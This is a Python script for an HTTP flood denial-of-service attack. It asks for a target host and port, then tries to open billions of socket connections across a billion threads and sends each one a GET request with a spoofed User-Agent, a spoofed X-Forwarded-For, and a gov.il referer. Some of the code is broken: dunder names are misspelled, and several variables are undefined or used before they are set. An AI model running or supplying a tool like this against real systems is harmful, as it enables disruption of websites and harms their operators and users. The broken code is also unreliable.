import socket
import threading
import select
from time import sleep

def create_nonblocking_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)
    return s

def connect_to_target(host, port):
    s = create_nonblocking_socket()
    try:
        s.connect((host, port))
    except BlockingIOError:
        pass
    except OSError as e:
        print(f"Error Connecting to {host}: {e}")
        return None
    return s

def send_packet(sockets, packet): #, host, port):
    for sock in sockets:
        try:
            #sleep(4.5)
            sock.send(packet.encode()) #, (host, port))
        except OSError as e:
            print(f"Error sending packet: {e}")

def main(target_host, target_port, num_connection, num_threads, packet):
    sockets = []
    threads = []
    connection_per_thread = num_connection // num_threads
    for _ in range(num_threads):
        thread_sockets = []
        for _ in range(connection_per_thread):
            s = connect_to_target(target_host, target_port)
            if s:
                thread_sockets.append(s)

        if thread_sockets:
            t = threading.Thread(target=send_packet, args=(thread_sockets,packet)) #,target_host,target_port))
            threads.append(t)
            t.start()

        if len(sockets) % 50 == 0:
            print(f"attack to {host} | sent {len(sockets)} connections")

        #sockets.extend(thread_sockets)

    for t in threads:
        t.join()

    while sockets:
        try:
            writable, _, _ = select.select(sockets, [], [])
            if writable:
                send_packet(writable, packet)
                break
        except ValueError as e:
            print(f"Value error: {e}")
            continue
        except Exception as e:
            print(f"Error Base: {e}")
            continue
        finally:
            s.close()

if _name_ == "_main_":
    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
    host = str(input('[+] Input your target: '))
    port = int(input('[+] Input port target: '))
#    fake_ip = str(input('[+] Input your fake ip: '))
    num = int(10000000000)
    thred = int(1000000000)

    packet = f"""\
GET /index.html HTTP/1.1\r
Host: {host}\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r
Connection: open\r
Referer: https://gov.il\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3\r
Accept-Encoding: gzip, deflate, br\r
Accept-Language: en-US,en;q=0.9\r
Cache-Control: no-cache\r
DNT: 1\r
Pragma: no-cache\r
Upgrade-Insecure-Requests: 1\r
X-Forwarded-For: 127.0.0.1\r\n\r\n
"""
    main(host, port, num, thred, packet)

